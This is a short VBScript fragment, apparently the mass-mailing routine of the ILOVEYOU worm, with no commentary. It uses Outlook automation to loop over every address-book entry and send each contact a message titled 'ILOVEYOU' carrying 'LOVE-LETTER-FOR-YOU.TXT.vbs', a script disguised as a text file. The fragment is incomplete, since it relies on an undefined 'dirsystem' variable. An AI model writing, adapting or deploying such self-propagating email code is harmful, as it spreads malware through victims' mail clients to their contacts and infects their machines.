set fso = createobject("Scripting.FileSystemObject")
set ol = createobject("outlook.application")
set ns = ol.getnamespace("mapi")
set gal = ns.addresslists(1)
for n = 1 to gal.addressentries.count
  set entry = gal.addressentries(n)
  set m = ol.createitem(0)
  m.recipients.add(entry)
  m.subject = "ILOVEYOU"
  m.attachments.add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
  m.send
next
